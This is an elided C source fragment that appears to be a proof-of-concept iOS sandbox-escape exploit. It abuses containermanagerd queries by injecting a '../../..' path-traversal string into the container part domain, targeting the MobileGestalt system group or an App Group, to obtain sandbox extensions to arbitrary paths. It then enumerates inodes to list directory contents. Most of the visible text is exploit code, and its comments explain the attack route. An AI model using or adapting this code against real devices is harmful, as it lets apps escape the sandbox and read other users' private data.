...
int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    ...
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags ||
        ...
        !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
    ...
    // Set up query.
    // Two routes: supply an App Group you control (to access other App Groups on iOS 26)
    // or don't, and use MobileGestalt's SystemGroup as a target instead.
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) → containermanagerd_system
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7); // Class 7 (MCMSharedDataContainer) → containermanagerd
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // Part 3 = Library/Caches (our traversal starting point)

    char *part = NULL;
    // Classic path traversal: escape from Library/Caches up to filesystem root
    if (group_identifier == NULL) {
        // SystemGroup: Library/Caches is 8 levels from /
        ...
        // App Group: one extra level to reach /
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            query_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
    ...
    // iOS 26 App Groups need different flags; doesn't apply on iOS 27
    if (is_group) {
    ...
    // Send query to containermanagerd
    ...
    if (!result) {
        ...
        query_free(query);
        dlclose(mgr);
        return -3; // Outside of sandbox / containermanager rejected
    }
    ...
    // Consume sandbox extension and clean up
...
char *bad_query_list(char *path, int64_t max_inode) {
    ...
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ...
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8; // strip /private prefix
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue; // only direct children
